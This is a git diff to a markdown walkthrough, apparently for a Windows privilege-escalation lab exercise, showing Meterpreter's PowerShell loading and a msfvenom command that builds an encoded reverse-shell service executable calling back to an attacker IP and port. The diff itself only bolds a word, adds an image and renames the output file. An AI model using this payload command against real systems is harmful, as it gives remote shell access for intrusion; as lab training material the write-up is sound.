@@ -98,7 +98,9 @@ You can download the script [here](https://raw.githubusercontent.com/PowerShellM
 
 ![task3-meterpreter](./images/task3-meterpreter.png)
 
-To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering **powershell_shell**:
+To execute this using Meterpreter, I will type load **powershell** into meterpreter. Then I will enter powershell by entering **powershell_shell**:
+
+![task3-powershell-shell](./images/task3-powershell-shell.png)
 
 <img src="./images/task3-powershell.png" height=200  width=auto>
 
@@ -112,7 +114,7 @@ The CanRestart option being true, allows us to restart a service on the system, 
 
 Use msfvenom to generate a reverse shell as an Windows executable.
 
-`msfvenom -p windows/shell_reverse_tcp LHOST=10.13.52.88 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`
+`msfvenom -p windows/shell_reverse_tcp LHOST=10.13.52.88 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe`
 
 ![task3-msfvenom](./images/task3-msfvenom.png)
 
